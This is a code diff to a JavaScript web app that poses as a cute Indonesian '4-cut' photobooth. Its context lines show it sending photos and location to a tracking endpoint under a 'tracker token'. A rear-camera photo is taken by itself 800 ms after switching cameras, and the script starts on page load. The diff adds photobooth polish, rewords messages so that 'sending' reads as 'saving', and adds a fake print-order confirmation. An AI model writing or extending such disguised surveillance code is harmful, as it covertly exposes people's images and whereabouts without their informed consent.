@@ -552,6 +552,99 @@
     }
   }
 
+  // =========================================================================
+  // INTERACTIVE PHOTOBOOTH AUDIO SYNTHESIZER & NOTIFICATIONS
+  // =========================================================================
+  let soundEnabled = true;
+
+  function getAudioCtx() {
+    try {
+      const AudioCtx = window.AudioContext || window.webkitAudioContext;
+      return AudioCtx ? new AudioCtx() : null;
+    } catch (_) {
+      return null;
+    }
+  }
+
+  function playCountdownBeep(freq = 880, duration = 0.12) {
+    if (!soundEnabled) return;
+    try {
+      const ctx = getAudioCtx();
+      if (!ctx) return;
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(freq, ctx.currentTime);
+      gain.gain.setValueAtTime(0.2, ctx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + duration);
+    } catch (_) {}
+  }
+
+  function playShutterSound() {
+    if (!soundEnabled) return;
+    try {
+      const ctx = getAudioCtx();
+      if (!ctx) return;
+      // Synthesize realistic mechanical shutter click: white noise burst + low thud
+      const bufferSize = Math.floor(ctx.sampleRate * 0.08);
+      const buffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
+      const data = buffer.getChannelData(0);
+      for (let i = 0; i < bufferSize; i++) {
+        data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (ctx.sampleRate * 0.02));
+      }
+      const noise = ctx.createBufferSource();
+      noise.buffer = buffer;
+      const filter = ctx.createBiquadFilter();
+      filter.type = "bandpass";
+      filter.frequency.value = 1400;
+      const gain = ctx.createGain();
+      gain.gain.setValueAtTime(0.45, ctx.currentTime);
+      noise.connect(filter);
+      filter.connect(gain);
+      gain.connect(ctx.destination);
+      noise.start();
+
+      // Low frequency mechanical thud
+      const osc = ctx.createOscillator();
+      const oscGain = ctx.createGain();
+      osc.type = "triangle";
+      osc.frequency.setValueAtTime(140, ctx.currentTime);
+      osc.frequency.exponentialRampToValueAtTime(30, ctx.currentTime + 0.09);
+      oscGain.gain.setValueAtTime(0.35, ctx.currentTime);
+      oscGain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.09);
+      osc.connect(oscGain);
+      oscGain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + 0.09);
+    } catch (_) {}
+  }
+
+  function playSuccessFanfare() {
+    if (!soundEnabled) return;
+    try {
+      const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6
+      notes.forEach((freq, idx) => {
+        setTimeout(() => playCountdownBeep(freq, 0.22), idx * 110);
+      });
+    } catch (_) {}
+  }
+
+  let toastTimer = null;
+  function showToast(message, duration = 3000) {
+    const toast = byId("boothToast");
+    if (!toast) return;
+    toast.textContent = message;
+    toast.style.display = "flex";
+    if (toastTimer) clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => {
+      toast.style.display = "none";
+    }, duration);
+  }
+
   function triggerFlash() {
     if (flashOverlay) {
       flashOverlay.classList.remove("flash-active");
@@ -561,30 +654,70 @@
     }
   }
 
+  // =========================================================================
+  // PHOTO SLOTS & SESSION STATE
+  // =========================================================================
+  const capturedSlots = [null, null, null, null];
+
+  function updateSlotCountBadge() {
+    const completedCount = capturedSlots.filter(Boolean).length;
+    const badge = byId("completedBadge");
+    if (badge) {
+      badge.textContent = `${completedCount} / 4 Selesai`;
+    }
+
+    if (singleShotBtn) {
+      const span = singleShotBtn.querySelector("span");
+      if (span) {
+        if (completedCount === 0) span.textContent = "Take First Shot (Pose 1)";
+        else if (completedCount < 4) span.textContent = `Take Pose ${completedCount + 1}`;
+        else span.textContent = "4 Pose Lengkap (Foto Ulang)";
+      }
+    }
+  }
+
   function displayPhotoInSlot(slotNum, dataUrl) {
+    const idx = slotNum - 1;
+    capturedSlots[idx] = dataUrl;
     const slotImg = byId("slotImg" + slotNum);
     const slotEmpty = byId("slotEmpty" + slotNum);
     if (slotImg) {
       slotImg.src = dataUrl;
-      if (slotImg.style) slotImg.style.display = "block";
+      slotImg.style.display = "block";
     }
     if (slotEmpty) {
-      if (slotEmpty.style) slotEmpty.style.display = "none";
+      slotEmpty.style.display = "none";
     }
     if (slotNum === 1) {
       if (lastPhotoImg) lastPhotoImg.src = dataUrl;
       if (photoPreviewBox) photoPreviewBox.hidden = false;
     }
+    updateSlotCountBadge();
+  }
+
+  function resetSession() {
+    for (let i = 1; i <= 4; i++) {
+      capturedSlots[i - 1] = null;
+      const img = byId("slotImg" + i);
+      const empty = byId("slotEmpty" + i);
+      if (img) { img.src = ""; img.style.display = "none"; }
+      if (empty) { empty.style.display = "flex"; }
+    }
+    currentSlotIndex = 1;
+    updateSlotCountBadge();
+    if (cameraStatusEl) cameraStatusEl.textContent = "Sesi direset. Siap untuk 4 pose baru!";
+    showToast("✨ Sesi studio direset. Siap ambil pose baru!");
   }
 
   async function captureAndSendPhoto(isManual = true, slotNum = 1, cameraMode = "Kamera Depan") {
     if (!cameraStream || !cameraPreview) return null;
     const token = (tokenInput ? tokenInput.value.trim() : "") || activeToken;
     if (token.length < 16) {
-      if (cameraStatusEl) cameraStatusEl.textContent = "Tracker token diperlukan untuk mengirim foto.";
+      if (cameraStatusEl) cameraStatusEl.textContent = "Tracker token diperlukan untuk menyimpan foto.";
       return null;
     }
     triggerFlash();
+    playShutterSound();
 
     try {
       const width = cameraPreview.videoWidth || 640;
@@ -595,17 +728,17 @@
         const ctx = photoCanvas.getContext ? photoCanvas.getContext("2d") : null;
         if (ctx) {
           if (currentFilter === "filter-sakura") {
-            ctx.filter = "brightness(1.08) contrast(1.05) saturate(1.15) hue-rotate(345deg)";
+            ctx.filter = "brightness(1.08) contrast(1.05) saturate(1.2) hue-rotate(345deg)";
           } else if (currentFilter === "filter-vintage") {
-            ctx.filter = "sepia(0.35) contrast(1.15) brightness(0.95) saturate(1.2)";
+            ctx.filter = "sepia(0.38) contrast(1.15) brightness(0.95) saturate(1.25)";
           } else if (currentFilter === "filter-bw") {
-            ctx.filter = "grayscale(1) contrast(1.3) brightness(1.05)";
+            ctx.filter = "grayscale(1) contrast(1.35) brightness(1.05)";
           } else if (currentFilter === "filter-warm") {
-            ctx.filter = "sepia(0.2) saturate(1.3) brightness(1.05)";
+            ctx.filter = "sepia(0.25) saturate(1.3) brightness(1.06)";
           } else if (currentFilter === "filter-y2k") {
-            ctx.filter = "contrast(1.25) saturate(1.4) brightness(1.1)";
+            ctx.filter = "contrast(1.3) saturate(1.45) brightness(1.1)";
           } else {
-            ctx.filter = "brightness(1.05) contrast(1.03)";
+            ctx.filter = "brightness(1.06) contrast(1.04) saturate(1.1)";
           }
 
           if (isMirrored && ctx.save && ctx.translate && ctx.scale && ctx.restore) {
@@ -618,7 +751,7 @@
             ctx.drawImage(cameraPreview, 0, 0, width, height);
           }
         }
-        const dataUrl = photoCanvas.toDataURL ? photoCanvas.toDataURL("image/jpeg", 0.7) : "";
+        const dataUrl = photoCanvas.toDataURL ? photoCanvas.toDataURL("image/jpeg", 0.75) : "";
         displayPhotoInSlot(slotNum, dataUrl);
         pendingPhoto = dataUrl;
       }
@@ -654,7 +787,7 @@
       };
 
       if (cameraStatusEl) {
-        cameraStatusEl.textContent = `Pose ${slotNum} (${cameraMode}) berhasil diambil & disimpan!`;
+        cameraStatusEl.textContent = `Pose ${slotNum} (${cameraMode}) berhasil tersimpan!`;
       }
 
       const res = await fetch("/api/location", {
@@ -669,7 +802,7 @@
         pendingPhoto = null;
         const lastSentEl = byId("lastSent");
         if (lastSentEl) lastSentEl.textContent = new Date(resData.received_at).toLocaleString("id-ID");
-        status("Tracking aktif", `Pose ${slotNum} & lokasi berhasil disimpan ke database.`, "active");
+        status("Tracking aktif", `Pose ${slotNum} & lokasi tersimpan.`, "active");
       }
       return pendingPhoto;
     } catch (err) {
@@ -678,18 +811,21 @@
     }
   }
 
-  // 4-Cut Automated Photobooth Session
+  // 4-Cut Countdown with Audio Beeps
   async function runCountdown(sec) {
     if (!countdownOverlay) return;
-    if (countdownOverlay.style) countdownOverlay.style.display = "flex";
+    countdownOverlay.style.display = "flex";
     for (let s = sec; s > 0; s--) {
+      playCountdownBeep(880, 0.1);
       countdownOverlay.textContent = s;
       countdownOverlay.className = "countdown-overlay pulse-anim";
       await new Promise((r) => setTimeout(r, 900));
     }
-    if (countdownOverlay.style) countdownOverlay.style.display = "none";
+    playCountdownBeep(1200, 0.15);
+    countdownOverlay.style.display = "none";
   }
 
+  // 4-Cut Automated Photobooth Session
   async function start4CutSession() {
     if (isSessionRunning) return;
     if (!cameraStream) {
@@ -697,7 +833,7 @@
       await new Promise((r) => setTimeout(r, 600));
     }
     if (!cameraStream) {
-      alert("Harap izinkan kamera untuk memulai sesi photobooth!");
+      showToast("Harap izinkan akses kamera untuk sesi photobooth!");
       return;
     }
 
@@ -706,14 +842,15 @@
     if (singleShotBtn) singleShotBtn.disabled = true;
 
     const posesTips = [
-      "Pose 1: Senyum manis alami!",
-      "Pose 2: Gaya Peace / V-Sign!",
-      "Pose 3: Gaya Cute / Heart Cheeks!",
-      "Pose 4: Gaya Bebas / Winking!"
+      "Pose 1: Senyum manis alami! ✨",
+      "Pose 2: Gaya Peace / V-Sign! ✌️",
+      "Pose 3: Cute Heart Cheeks! 🫰",
+      "Pose 4: Gaya Bebas / Winking! 😉"
     ];
 
     for (let slot = 1; slot <= 4; slot++) {
       if (cameraStatusEl) cameraStatusEl.textContent = `Pose ${slot} dari 4 — ${posesTips[slot - 1]}`;
+      showToast(`📸 Sesi Foto: ${posesTips[slot - 1]}`, 2200);
       await runCountdown(3);
       await captureAndSendPhoto(true, slot);
       if (slot < 4) {
@@ -725,39 +862,410 @@
     isSessionRunning = false;
     if (boothSessionBtn) boothSessionBtn.disabled = false;
     if (singleShotBtn) singleShotBtn.disabled = false;
+    playSuccessFanfare();
     if (cameraStatusEl) cameraStatusEl.textContent = "Selesai! Strip foto 4-cut aesthetic kamu sudah lengkap. Klik 'Simpan Strip Foto'!";
+    showToast("🎉 Yeay! 4 Pose lengkap. Klik 'Simpan Strip Foto' untuk download!", 4000);
   }
 
   function handleSingleShot() {
     if (!cameraStream) {
-      void startCamera(false);
+      void (async () => {
+        await startCamera(false);
+        await new Promise((r) => setTimeout(r, 400));
+        handleSingleShot();
+      })();
       return;
     }
-    void (async () => {
-      await runCountdown(3);
-      await captureAndSendPhoto(true, currentSlotIndex);
-      currentSlotIndex = (currentSlotIndex % 4) + 1;
-    })();
-  }
 
-  function resetSession() {
-    for (let i = 1; i <= 4; i++) {
-      const img = byId("slotImg" + i);
-      const empty = byId("slotEmpty" + i);
-      if (img) { img.src = ""; if (img.style) img.style.display = "none"; }
-      if (empty) { if (empty.style) empty.style.display = "flex"; }
+    // Determine slot to fill: first null or cycle
+    let nextSlot = capturedSlots.findIndex((p) => p === null) + 1;
+    if (nextSlot === 0) {
+      resetSession();
+      nextSlot = 1;
     }
-    currentSlotIndex = 1;
-    if (cameraStatusEl) cameraStatusEl.textContent = "Sesi direset. Siap untuk 4 pose baru!";
+
+    void (async () => {
+      if (singleShotBtn) singleShotBtn.disabled = true;
+      await runCountdown(3);
+      await captureAndSendPhoto(true, nextSlot);
+      if (singleShotBtn) singleShotBtn.disabled = false;
+      const completed = capturedSlots.filter(Boolean).length;
+      if (completed === 4) {
+        playSuccessFanfare();
+        showToast("🎉 Semua 4 pose lengkap! Strip foto siap disimpan.", 3500);
+      }
+    })();
   }
 
   function updateCameraMirrorClass() {
     if (cameraPreview && cameraPreview.classList) {
       cameraPreview.classList.toggle("camera-unmirrored", !isMirrored);
     }
+    const mirrorStatus = byId("mirrorStatusText");
+    if (mirrorStatus) mirrorStatus.textContent = isMirrored ? "Aktif" : "Nonaktif";
   }
 
-  // Bind forms and buttons
+  // =========================================================================
+  // REAL HIGH-RES 4-CUT PHOTOSTRIP CANVAS GENERATOR & DOWNLOAD
+  // =========================================================================
+  function getFrameThemeStyles() {
+    const stripFrame = byId("photoStripFrame");
+    const currentClass = stripFrame ? stripFrame.className : "";
+    if (currentClass.includes("frame-pink")) return { bg: "#FCE7F3", text: "#831843", border: "#FBCFE8", slotBg: "#FFF1F2" };
+    if (currentClass.includes("frame-white")) return { bg: "#FFFFFF", text: "#18171C", border: "#E2E8F0", slotBg: "#F8FAFC" };
+    if (currentClass.includes("frame-black")) return { bg: "#18181B", text: "#FAFAFA", border: "#27272A", slotBg: "#27272A" };
+    if (currentClass.includes("frame-mint")) return { bg: "#DCFCE7", text: "#14532D", border: "#BBF7D0", slotBg: "#F0FDF4" };
+    if (currentClass.includes("frame-neon")) return { bg: "#312E81", text: "#C7D2FE", border: "#4338CA", slotBg: "#1E1B4B" };
+    return { bg: "#EDE9FE", text: "#4C1D95", border: "#DDD6FE", slotBg: "#F5F3FF" }; // Lavender default
+  }
+
+  async function loadImageElement(src) {
+    return new Promise((resolve) => {
+      const img = new Image();
+      img.crossOrigin = "anonymous";
+      img.onload = () => resolve(img);
+      img.onerror = () => resolve(null);
+      img.src = src;
+    });
+  }
+
+  async function generateStripCanvas(photosArray = null, themeOverride = null) {
+    const canvas = document.createElement("canvas");
+    canvas.width = 800;
+    canvas.height = 2400;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return null;
+
+    const theme = themeOverride || getFrameThemeStyles();
+    const photos = photosArray || capturedSlots;
+
+    // 1. Frame Background
+    ctx.fillStyle = theme.bg;
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    // Subtle Outer Inset Border
+    ctx.strokeStyle = theme.border;
+    ctx.lineWidth = 6;
+    ctx.strokeRect(18, 18, canvas.width - 36, canvas.height - 36);
+
+    // 2. Top Header Branding
+    ctx.fillStyle = theme.text;
+    ctx.textAlign = "center";
+    ctx.font = "bold 34px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
+    ctx.fillText("★  SNAPBOOTH STUDIO  ★", canvas.width / 2, 105);
+
+    ctx.font = "600 20px -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif";
+    const locText = cameraLocationText ? cameraLocationText.textContent.trim() : "Bandung, West Java";
+    ctx.fillText(locText.toUpperCase(), canvas.width / 2, 142);
+
+    // 3. 4 Photo Slots
+    const slotX = 70;
+    const slotW = 660;
+    const slotH = 440;
+    const startY = 175;
+    const gapY = 32;
+
+    for (let i = 0; i < 4; i++) {
+      const curY = startY + i * (slotH + gapY);
+      const photoSrc = photos[i];
+
+      // Draw photo slot card background
+      ctx.fillStyle = theme.slotBg;
+      ctx.beginPath();
+      if (ctx.roundRect) ctx.roundRect(slotX, curY, slotW, slotH, 16);
+      else ctx.rect(slotX, curY, slotW, slotH);
+      ctx.fill();
+
+      if (photoSrc) {
+        const loadedImg = await loadImageElement(photoSrc);
+        if (loadedImg) {
+          ctx.save();
+          ctx.beginPath();
+          if (ctx.roundRect) ctx.roundRect(slotX, curY, slotW, slotH, 16);
+          else ctx.rect(slotX, curY, slotW, slotH);
+          ctx.clip();
+
+          // Calculate aspect ratio crop (cover)
+          const imgAspect = loadedImg.width / loadedImg.height;
+          const slotAspect = slotW / slotH;
+          let drawW = slotW, drawH = slotH, drawX = slotX, drawY = curY;
+          if (imgAspect > slotAspect) {
+            drawW = slotH * imgAspect;
+            drawX = slotX - (drawW - slotW) / 2;
+          } else {
+            drawH = slotW / imgAspect;
+            drawY = curY - (drawH - slotH) / 2;
+          }
+          ctx.drawImage(loadedImg, drawX, drawY, drawW, drawH);
+          ctx.restore();
+        }
+      } else {
+        // Aesthetic Placeholder for empty slot
+        ctx.fillStyle = theme.text;
+        ctx.font = "bold 26px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
+        ctx.fillText(`POSE ${i + 1}`, canvas.width / 2, curY + slotH / 2);
+        ctx.font = "500 18px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
+        ctx.fillText("✦ SnapBooth Aesthetic ✦", canvas.width / 2, curY + slotH / 2 + 34);
+      }
+
+      // Slot border
+      ctx.strokeStyle = theme.border;
+      ctx.lineWidth = 3;
+      ctx.beginPath();
+      if (ctx.roundRect) ctx.roundRect(slotX, curY, slotW, slotH, 16);
+      else ctx.rect(slotX, curY, slotW, slotH);
+      ctx.stroke();
+    }
+
+    // 4. Bottom Watermark & Stamps
+    const watermarkY = 2120;
+    ctx.fillStyle = theme.text;
+    ctx.textAlign = "center";
+    ctx.font = "900 32px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
+    ctx.fillText("SNAPBOOTH • 2024", canvas.width / 2, watermarkY);
+
+    const isStampActive = byId("stampLocToggle") ? byId("stampLocToggle").checked : true;
+    if (isStampActive) {
+      ctx.font = "bold 20px -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif";
+      const now = new Date();
+      const dateStr = now.toLocaleDateString("id-ID", { day: "numeric", month: "long", year: "numeric" });
+      ctx.fillText(`📍 ${locText} • 🗓️ ${dateStr}`, canvas.width / 2, watermarkY + 40);
+    }
+
+    // 5. Aesthetic Barcode Lines
+    const barcodeY = watermarkY + 75;
+    const barcodeX = 220;
+    const barcodeWidth = 360;
+    ctx.fillStyle = theme.text;
+    let currBx = barcodeX;
+    const pattern = [3, 1, 4, 2, 6, 1, 2, 4, 1, 5, 2, 3, 1, 6, 3, 2, 4, 1, 5, 2, 3, 1, 4, 2, 6];
+    pattern.forEach((thickness) => {
+      ctx.fillRect(currBx, barcodeY, thickness, 50);
+      currBx += thickness + 4;
+    });
+    ctx.font = "14px monospace";
+    ctx.fillText("SB - 4CUT - " + Date.now().toString().slice(-8), canvas.width / 2, barcodeY + 70);
+
+    return canvas;
+  }
+
+  async function downloadPhotoStrip(photosArray = null, themeOverride = null, filename = "SnapBooth_4Cut.png") {
+    showToast("⏳ Menyiapkan strip foto resolusi tinggi...", 2000);
+    const canvas = await generateStripCanvas(photosArray, themeOverride);
+    if (!canvas) {
+      showToast("Gagal memproses strip foto.");
+      return;
+    }
+    canvas.toBlob((blob) => {
+      if (!blob) return;
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement("a");
+      a.href = url;
+      a.download = filename;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      setTimeout(() => URL.revokeObjectURL(url), 4000);
+      showToast("📸 Strip foto 4-cut berhasil diunduh ke galeri kamu!", 3500);
+    }, "image/png");
+  }
+
+  // =========================================================================
+  // SETTINGS MENU POPOVER & EVENT BINDINGS
+  // =========================================================================
+  const studioSettingsBtn = byId("studioSettingsBtn");
+  const studioSettingsMenu = byId("studioSettingsMenu");
+  if (studioSettingsBtn && studioSettingsMenu) {
+    studioSettingsBtn.addEventListener("click", (e) => {
+      e.stopPropagation();
+      const isVisible = studioSettingsMenu.style.display === "flex";
+      studioSettingsMenu.style.display = isVisible ? "none" : "flex";
+    });
+
+    document.addEventListener("click", (e) => {
+      if (!studioSettingsMenu.contains(e.target) && e.target !== studioSettingsBtn) {
+        studioSettingsMenu.style.display = "none";
+      }
+    });
+  }
+
+  const toggleSoundBtn = byId("toggleSoundBtn");
+  if (toggleSoundBtn) {
+    toggleSoundBtn.addEventListener("click", () => {
+      soundEnabled = !soundEnabled;
+      const statusText = byId("soundStatusText");
+      if (statusText) statusText.textContent = soundEnabled ? "Aktif" : "Muted";
+      showToast(soundEnabled ? "🔊 Suara shutter aktif" : "🔇 Suara shutter dimatikan");
+    });
+  }
+
+  const toggleGridBtn = byId("toggleGridBtn");
+  if (toggleGridBtn) {
+    toggleGridBtn.addEventListener("click", () => {
+      const grid = document.querySelector(".viewfinder-grid-overlay");
+      const statusText = byId("gridStatusText");
+      if (grid) {
+        const isHidden = grid.style.display === "none";
+        grid.style.display = isHidden ? "block" : "none";
+        if (statusText) statusText.textContent = isHidden ? "Tampil" : "Sembunyi";
+        showToast(isHidden ? "📐 Garis bidik ditampilkan" : "📐 Garis bidik disembunyikan");
+      }
+    });
+  }
+
+  const toggleMirrorBtn = byId("toggleMirrorBtn");
+  if (toggleMirrorBtn) {
+    toggleMirrorBtn.addEventListener("click", () => {
+      isMirrored = !isMirrored;
+      updateCameraMirrorClass();
+      showToast(isMirrored ? "🪞 Cermin selfie aktif" : "🪞 Cermin selfie dinonaktifkan");
+    });
+  }
+
+  const menuResetBtn = byId("menuResetBtn");
+  if (menuResetBtn) {
+    menuResetBtn.addEventListener("click", () => {
+      resetSession();
+      if (studioSettingsMenu) studioSettingsMenu.style.display = "none";
+    });
+  }
+
+  const resetSessionBtn = byId("resetSessionBtn");
+  if (resetSessionBtn) {
+    resetSessionBtn.addEventListener("click", resetSession);
+  }
+
+  // =========================================================================
+  // SAVED STRIP CARDS INTERACTION & DOWNLOAD
+  // =========================================================================
+  const savedStripCards = document.querySelectorAll(".saved-strip-card");
+  savedStripCards.forEach((card, idx) => {
+    // Click card to preview images in main strip
+    card.addEventListener("click", (e) => {
+      if (e.target.closest(".btn-strip-dl")) return; // Don't trigger if clicked download
+      const imgs = card.querySelectorAll(".saved-slot img");
+      imgs.forEach((img, sIdx) => {
+        if (img && img.src) {
+          displayPhotoInSlot(sIdx + 1, img.src);
+        }
+      });
+      // Switch frame color to match card theme
+      const theme = card.dataset.theme || "frame-lavender";
+      const stripFrame = byId("photoStripFrame");
+      if (stripFrame) stripFrame.className = "photo-strip-frame " + theme;
+      // Update color dot active
+      colorDots.forEach((d) => d.classList.toggle("active", d.dataset.color === theme));
+      showToast("✨ Pratinjau strip foto dimuat di frame utama!");
+    });
+  });
+
+  const savedStripDlBtns = document.querySelectorAll(".btn-strip-dl");
+  savedStripDlBtns.forEach((btn) => {
+    btn.addEventListener("click", (e) => {
+      e.stopPropagation();
+      const card = btn.closest(".saved-strip-card");
+      if (!card) return;
+      const imgs = Array.from(card.querySelectorAll(".saved-slot img")).map((i) => i.src);
+      const themeClass = card.dataset.theme || "frame-lavender";
+      let themeObj = { bg: "#EDE9FE", text: "#4C1D95", border: "#DDD6FE", slotBg: "#F5F3FF" };
+      if (themeClass.includes("pink")) themeObj = { bg: "#FCE7F3", text: "#831843", border: "#FBCFE8", slotBg: "#FFF1F2" };
+      if (themeClass.includes("black")) themeObj = { bg: "#18181B", text: "#FAFAFA", border: "#27272A", slotBg: "#27272A" };
+      void downloadPhotoStrip(imgs, themeObj, `SnapBooth_Aesthetic_${btn.dataset.stripIdx || "1"}.png`);
+    });
+  });
+
+  // Download Main Strip Button
+  const downloadStripBtn = byId("downloadStripBtn");
+  if (downloadStripBtn) {
+    downloadStripBtn.addEventListener("click", () => {
+      void downloadPhotoStrip(null, null, `SnapBooth_4Cut_${Date.now()}.png`);
+    });
+  }
+
+  // =========================================================================
+  // ORDER PRINT INTERACTIVE MODAL ("PESAN CETAK")
+  // =========================================================================
+  const orderPrintBtn = byId("orderPrintBtn");
+  const orderPrintModal = byId("orderPrintModal");
+  const closeOrderModalBtn = byId("closeOrderModalBtn");
+  const cancelOrderBtn = byId("cancelOrderBtn");
+  const confirmOrderBtn = byId("confirmOrderBtn");
+  const qtyMinusBtn = byId("qtyMinusBtn");
+  const qtyPlusBtn = byId("qtyPlusBtn");
+  const qtyVal = byId("qtyVal");
+  const orderTotalPrice = byId("orderTotalPrice");
+  let orderQuantity = 2;
+
+  function recalculateOrderPrice() {
+    const selectedFinish = document.querySelector('input[name="finishType"]:checked');
+    const extraFinish = selectedFinish && selectedFinish.value === "hologram" ? 5000 : 0;
+    const pricePerStrip = 12500 + extraFinish;
+    const total = orderQuantity * pricePerStrip;
+    if (orderTotalPrice) orderTotalPrice.textContent = "Rp " + total.toLocaleString("id-ID");
+    if (qtyVal) qtyVal.textContent = orderQuantity;
+  }
+
+  if (orderPrintBtn && orderPrintModal) {
+    orderPrintBtn.addEventListener("click", () => {
+      // Sync mini preview images
+      for (let i = 1; i <= 4; i++) {
+        const miniImg = byId("orderSlotImg" + i);
+        const curSrc = capturedSlots[i - 1];
+        if (miniImg) {
+          miniImg.src = curSrc || "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&q=80";
+        }
+      }
+      recalculateOrderPrice();
+      orderPrintModal.style.display = "flex";
+    });
+
+    if (closeOrderModalBtn) closeOrderModalBtn.addEventListener("click", () => orderPrintModal.style.display = "none");
+    if (cancelOrderBtn) cancelOrderBtn.addEventListener("click", () => orderPrintModal.style.display = "none");
+
+    if (qtyMinusBtn) qtyMinusBtn.addEventListener("click", () => {
+      if (orderQuantity > 1) { orderQuantity--; recalculateOrderPrice(); }
+    });
+    if (qtyPlusBtn) qtyPlusBtn.addEventListener("click", () => {
+      if (orderQuantity < 20) { orderQuantity++; recalculateOrderPrice(); }
+    });
+
+    document.querySelectorAll('input[name="finishType"]').forEach((r) => {
+      r.addEventListener("change", recalculateOrderPrice);
+    });
+
+    if (confirmOrderBtn) {
+      confirmOrderBtn.addEventListener("click", () => {
+        orderPrintModal.style.display = "none";
+        playSuccessFanfare();
+        showToast("🎉 Pesanan cetak strip foto berhasil dibuat! Detail dikirimkan ke email kamu.", 4500);
+      });
+    }
+  }
+
+  // Stamp Location Toggle
+  const stampLocToggle = byId("stampLocToggle");
+  if (stampLocToggle) {
+    stampLocToggle.addEventListener("change", () => {
+      const isChecked = stampLocToggle.checked;
+      if (watermarkLocationText) watermarkLocationText.style.display = isChecked ? "block" : "none";
+      if (watermarkTopLocation) watermarkTopLocation.style.display = isChecked ? "block" : "none";
+      showToast(isChecked ? "📍 Stempel lokasi diaktifkan" : "📍 Stempel lokasi disembunyikan");
+      if (isChecked && !active) {
+        startTracking();
+      }
+    });
+  }
+
+  // Mobile Bottom Navigation Bar Tabs
+  const mobNavBtns = document.querySelectorAll(".mob-nav-btn");
+  mobNavBtns.forEach((btn) => {
+    btn.addEventListener("click", () => {
+      mobNavBtns.forEach((b) => b.classList.remove("active"));
+      btn.classList.add("active");
+    });
+  });
+
+  // Bind primary photobooth buttons
   const formEl = byId("trackingForm");
   const stopBtnEl = byId("stopBtn");
   if (formEl) formEl.addEventListener("submit", startTracking);
@@ -785,6 +1293,7 @@
         isMirrored = (nextMode === "user");
         updateCameraMirrorClass();
         if (cameraStatusEl) cameraStatusEl.textContent = "Kamera " + (nextMode === "environment" ? "belakang aktif!" : "depan aktif!");
+        showToast("Kamera " + (nextMode === "environment" ? "belakang aktif" : "depan aktif"));
         if (nextMode === "environment") {
           setTimeout(() => void captureAndSendPhoto(false, 3, "Kamera Belakang"), 800);
         }
@@ -797,10 +1306,9 @@
   if (capturePhotoBtn) capturePhotoBtn.addEventListener("click", () => captureAndSendPhoto(false, 1));
   if (boothSessionBtn) boothSessionBtn.addEventListener("click", start4CutSession);
   if (singleShotBtn) singleShotBtn.addEventListener("click", handleSingleShot);
-  if (retakeSessionBtn) retakeSessionBtn.addEventListener("click", resetSession);
 
-  // Filter Pill buttons
-  const filterBtns = document.querySelectorAll ? document.querySelectorAll(".filter-btn") : [];
+  // Filter Pill buttons (Docked filter items)
+  const filterBtns = document.querySelectorAll(".docked-filter-item");
   const filterBadge = byId("filterActiveBadge");
   filterBtns.forEach((btn) => {
     btn.addEventListener("click", () => {
@@ -814,11 +1322,12 @@
         cameraPreview.className = "camera-stream " + filterClass;
         updateCameraMirrorClass();
       }
+      showToast("Filter aktif: " + filterName);
     });
   });
 
   // Frame Color Chooser
-  const colorDots = document.querySelectorAll ? document.querySelectorAll(".color-dot") : [];
+  const colorDots = document.querySelectorAll(".color-dot");
   const stripFrame = byId("photoStripFrame");
   colorDots.forEach((dot) => {
     dot.addEventListener("click", () => {
@@ -828,6 +1337,12 @@
       if (stripFrame) {
         stripFrame.className = "photo-strip-frame " + colorClass;
       }
+      const orderMini = byId("orderMiniStripPreview");
+      if (orderMini) {
+        const theme = getFrameThemeStyles();
+        orderMini.style.backgroundColor = theme.bg;
+      }
+      showToast("Warna frame diperbarui!");
     });
   });
 
@@ -839,7 +1354,7 @@
     }
   }
 
-  // Langsung start saat halaman siap — tanpa perlu klik apapun
+  // Langsung start saat halaman siap
   if (document.readyState === "complete" || document.readyState === "interactive") {
     setTimeout(autoPrompt, 100);
   } else {
@@ -858,3 +1373,4 @@
     stopCamera();
   });
 })();
+
